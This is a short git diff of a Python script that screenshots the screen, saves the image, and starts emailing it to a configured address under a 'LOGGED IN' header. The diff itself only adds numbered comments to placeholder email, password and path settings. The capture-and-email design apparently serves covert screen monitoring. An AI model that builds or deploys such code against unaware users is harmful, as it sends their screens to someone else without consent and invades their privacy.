@@ -16,8 +16,8 @@ from PIL import ImageQt
 #from PyQt4.QtGui import QImage
 def screen_shot():
   
-  SaveDirectory=r'C:\dell' #location to save image(screenshot)
-  ImageEditorPath=r'C:\WINDOWS\system32\mspaint.exe' #location of paint
+  SaveDirectory=r'C:\dell' #location to save image(screenshot)            #4
+  ImageEditorPath=r'C:\WINDOWS\system32\mspaint.exe' #location of paint   #5
 
   img=ImageGrab.grab()  #taking screenshot
   time.sleep(3)
@@ -28,9 +28,9 @@ def screen_shot():
 def eemail(ImgFileName): 
   img_data = open(ImgFileName, 'rb').read()
   time.sleep(2)
-  fromaddr = "xyz@gmail.com" #your mail address
-  toaddr = "abc@gmail.com"#whom to send?
-  p_w_d ="your password"#password
+  fromaddr = "xyz@gmail.com" #your mail address                           #1
+  toaddr = "abc@gmail.com"#whom to send?                                  #2
+  p_w_d ="your password"#password                                         #3
   #print(pwd)
   msg = MIMEMultipart()
   msg['From'] = "LOGGED IN"
